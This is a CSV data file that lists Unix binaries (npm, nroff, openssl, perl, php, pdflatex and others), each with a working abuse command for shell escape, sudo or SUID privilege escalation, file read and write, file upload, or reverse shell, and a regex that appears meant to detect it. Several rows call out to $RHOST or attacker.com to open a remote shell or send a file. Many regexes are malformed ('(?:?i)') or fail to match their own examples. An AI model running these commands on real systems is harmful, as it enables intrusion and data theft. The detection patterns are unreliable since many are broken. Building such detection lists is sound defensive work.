Name,Function,ExampleCode,Regex,Notes
npm,shell,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json
npm -C $TF i","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?npm\s*\-C\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
npm,sudo,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?npm\s*\-C\s*\-\-unsafe\-perm\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nroff,file-read,nroff $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nroff\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nroff,shell,"echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
GROFF_BIN_PATH=$TF nroff","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nroff\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nroff,sudo,"echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
sudo GROFF_BIN_PATH=$TF nroff","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nroff\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nsenter,shell,nsenter /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nsenter\s+(?:/bin/(?:sh|bash))),
nsenter,sudo,sudo nsenter /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?nsenter\s+(?:/bin/(?:sh|bash))),
ntpdate,file-read,ntpdate -a x -k $LFILE -d localhost,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ntpdate\s*\-a\s*\-k\s*\-d\s+(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ntpdate,sudo,sudo ntpdate -a x -k $LFILE -d localhost,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ntpdate\s*\-a\s*\-k\s*\-d\s+(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ntpdate,suid,./ntpdate -a x -k $LFILE -d localhost,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ntpdate\s*\-a\s*\-k\s*\-d\s+(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
octave,shell,"octave-cli --eval 'system(""/bin/sh"")'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?octave\s*\-\-eval\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
octave,file-write,"octave-cli --eval 'filename = ""file_to_write""; fid = fopen(filename, ""w""); fputs(fid, ""DATA""); fclose(fid);'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?octave\s*\-\-eval\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
octave,file-read,"octave-cli --eval 'format none; fid = fopen(""file_to_read""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?octave\s*\-\-eval\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
octave,sudo,"sudo octave-cli --eval 'system(""/bin/sh"")'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?octave\s*\-\-eval\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
octave,limited-suid,"./octave-cli --eval 'system(""/bin/sh"")'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?octave\s*\-\-eval\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
od,file-read,"od -An -c -w9999 ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?od\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
od,suid,"./od -An -c -w9999 ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?od\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
od,sudo,"sudo od -An -c -w9999 ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?od\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,reverse-shell,mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openssl\s*\-i\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,file-upload,"openssl s_client -quiet -connect $RHOST:$RPORT < ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openssl\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,file-download,"openssl s_client -quiet -connect $RHOST:$RPORT > ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openssl\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,file-write,"echo DATA | openssl enc -out ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openssl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,file-write,"echo ""DATA"" > $TF
openssl enc -in ""$TF"" -out ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openssl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,file-read,"openssl enc -in ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openssl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,suid,mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openssl\s*\-i\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,suid,"echo DATA | openssl enc -out ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openssl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,sudo,mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openssl\s*\-i\s+(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openssl,library-load,openssl req -engine ./lib.so,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openssl\s+.+),
openvpn,shell,openvpn --dev null --script-security 2 --up '/bin/sh -c sh',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-dev\s*\-\-script\-security\s*\-\-up\s*\-c\s+(?:/bin/(?:sh|bash))),
openvpn,file-read,"openvpn --config ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-config\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openvpn,suid,"./openvpn --dev null --script-security 2 --up '/bin/sh -p -c ""sh -p""'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-dev\s*\-\-script\-security\s*\-\-up\s*\-p\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash))),
openvpn,suid,"./openvpn --config ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-config\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openvpn,sudo,sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-dev\s*\-\-script\-security\s*\-\-up\s*\-c\s+(?:/bin/(?:sh|bash))),
openvpn,sudo,"sudo openvpn --config ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openvpn\s*\-\-config\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
openvt,sudo,"sudo openvt -- sh -c ""$COMMAND >$TF 2>&1""
cat $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?openvt\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
opkg,sudo,sudo opkg install x_1.0_all.deb,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?opkg\s+.+),
pandoc,file-read,"pandoc -t plain ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pandoc\s*\-t\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pandoc,file-write,"echo DATA | pandoc -t plain -o ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pandoc\s*\-t\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pandoc,shell,"echo 'os.execute(""/bin/sh"")' >$TF
pandoc -L $TF /dev/null","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pandoc\s*\-L\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pandoc,suid,"echo DATA | ./pandoc -t plain -o ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pandoc\s*\-t\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pandoc,limited-suid,"echo 'os.execute(""/bin/sh"")' >$TF
./pandoc -L $TF /dev/null","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pandoc\s*\-L\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pandoc,sudo,"echo 'os.execute(""/bin/sh"")' >$TF
sudo pandoc -L $TF /dev/null","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pandoc\s*\-L\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
paste,file-read,paste $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?paste\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
paste,suid,paste $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?paste\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
paste,sudo,sudo paste $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?paste\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pax,file-read,"pax -w ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pax\s*\-w\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pdb,shell,"echo 'import os; os.system(""/bin/sh"")' > $TF
pdb $TF
cont","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pdb\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pdb,sudo,"echo 'import os; os.system(""/bin/sh"")' > $TF
sudo pdb $TF
cont","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pdb\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pdflatex,shell,pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pdflatex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
pdflatex,file-read,"pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pdflatex\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pdflatex,sudo,"sudo pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pdflatex\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pdflatex,sudo,sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pdflatex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
pdflatex,limited-suid,./pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pdflatex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b)),
pdftex,shell,pdftex --shell-escape '\write18{/bin/sh}\end',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pdftex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
pdftex,sudo,sudo pdftex --shell-escape '\write18{/bin/sh}\end',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pdftex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
pdftex,limited-suid,./pdftex --shell-escape '\write18{/bin/sh}\end',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pdftex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
perf,shell,perf stat /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?perf\s+(?:/bin/(?:sh|bash))),
perf,suid,./perf stat /bin/sh -p,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?perf\s*\-p\s+(?:/bin/(?:sh|bash))),
perf,sudo,sudo perf stat /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?perf\s+(?:/bin/(?:sh|bash))),
perl,shell,"perl -e 'exec ""/bin/sh"";'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?perl\s*\-e\s+(?:/bin/(?:sh|bash))),
perl,file-read,perl -ne print $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?perl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
perl,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
perl -e 'use Socket;$i=""$ENV{RHOST}"";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?perl\s*\-e\s*\-i\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
perl,suid,"./perl -e 'exec ""/bin/sh"";'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?perl\s*\-e\s+(?:/bin/(?:sh|bash))),
perl,sudo,"sudo perl -e 'exec ""/bin/sh"";'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?perl\s*\-e\s+(?:/bin/(?:sh|bash))),
perl,capabilities,"./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec ""/bin/sh"";'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?perl\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
perlbug,shell,perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?perlbug\s*\-s\s*\-r\s*\-c\s*\-e\s+(?:/bin/(?:sh|bash))),
perlbug,sudo,sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?perlbug\s*\-s\s*\-r\s*\-c\s*\-e\s+(?:/bin/(?:sh|bash))),
pexec,shell,pexec /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pexec\s+(?:/bin/(?:sh|bash))),
pexec,suid,./pexec /bin/sh -p,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pexec\s*\-p\s+(?:/bin/(?:sh|bash))),
pexec,sudo,sudo pexec /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pexec\s+(?:/bin/(?:sh|bash))),
pg,shell,"pg /etc/profile
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pg\s+(?:/bin/(?:sh|bash))),
pg,file-read,pg file_to_read,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pg\s+.+),
pg,sudo,"sudo pg /etc/profile
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pg\s+(?:/bin/(?:sh|bash))),
pg,suid,./pg file_to_read,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?pg\s+.+),
php,shell,"export CMD=""/bin/sh""
php -r 'system(getenv(""CMD""));'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:getenv\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
php,shell,"export CMD=""/bin/sh""
php -r 'passthru(getenv(""CMD""));'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:getenv\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
php,shell,"export CMD=""/bin/sh""
php -r 'print(shell_exec(getenv(""CMD"")));'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:getenv\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
php,shell,"export CMD=""/bin/sh""
php -r '$r=array(); exec(getenv(""CMD""), $r); print(join(""\\n"",$r));'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:getenv\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
php,shell,"export CMD=""/bin/sh""
php -r '$h=@popen(getenv(""CMD""),""r""); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:getenv\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
php,command,"export CMD=""id""
php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(getenv(""CMD""), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?php\s*\-r\s+(?:getenv\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:proc_open\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
